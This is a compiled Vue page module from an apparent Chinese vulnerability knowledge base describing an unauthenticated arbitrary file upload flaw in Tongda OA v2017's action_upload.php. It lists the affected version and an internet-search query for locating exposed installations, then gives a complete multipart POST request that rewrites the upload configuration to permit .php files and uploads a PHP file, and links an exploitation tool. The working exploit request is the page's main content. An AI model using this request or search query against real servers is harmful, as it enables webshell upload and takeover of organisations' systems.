import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as s,c as d,a as n,b as e,d as l,e as o}from"./app-58e4a7d6.js";const r={},c=o(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>通达OA v2017
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;TDXK-通达OA&quot; 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问获取版本信息</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091053148.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送请求包上传任意文件</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 893
Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724
X_requested_with: XMLHttpRequest
Accept-Encoding: gzip

-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name=&quot;CONFIG[fileFieldName]&quot;

ffff
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name=&quot;CONFIG[fileMaxSize]&quot;

1000000000
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name=&quot;CONFIG[filePathFormat]&quot;

tcmd
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name=&quot;CONFIG[fileAllowFiles][]&quot;

.php
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name=&quot;ffff&quot;; filename=&quot;test.php&quot;
Content-Type: application/octet-stream

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name=&quot;mufile&quot;

submit
-----------------------------55719851240137822763221368724--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091053293.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再访问上传的文件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091053249.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),p={href:"https://github.com/Fu5r0dah/TongdaScan_go",target:"_blank",rel:"noopener noreferrer"};function u(v,m){const i=t("ExternalLinkIcon");return s(),d("div",null,[c,n("p",null,[e("利用工具："),n("a",p,[e("https://github.com/Fu5r0dah/TongdaScan_go"),l(i)])])])}const f=a(r,[["render",u],["__file","通达OA v2017 action_upload.php 任意文件上传漏洞.html.vue"]]);export{f as default};
